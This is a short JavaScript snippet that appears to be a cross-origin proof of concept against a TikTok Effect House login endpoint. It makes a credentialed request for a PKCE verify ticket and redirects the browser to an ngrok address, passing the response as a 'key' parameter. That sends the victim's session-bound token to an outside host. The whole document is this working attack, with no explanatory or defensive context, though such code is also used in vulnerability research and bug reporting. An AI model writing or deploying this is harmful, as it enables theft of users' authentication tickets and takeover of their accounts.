var xhr = new XMLHttpRequest();

xhr.onload = reqListener; 
xhr.open("GET", "https://effecthouse.tiktok.com/passport/web/gen_pkce_verify_ticket/?aid=1459&code_challenge=dbb01a97d20b2f52e06b0443c5b16841&language=en");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send();

function reqListener() {
    location='//0e11-202-162-37-174.ngrok-free.app/?key='+this.responseText; 
};
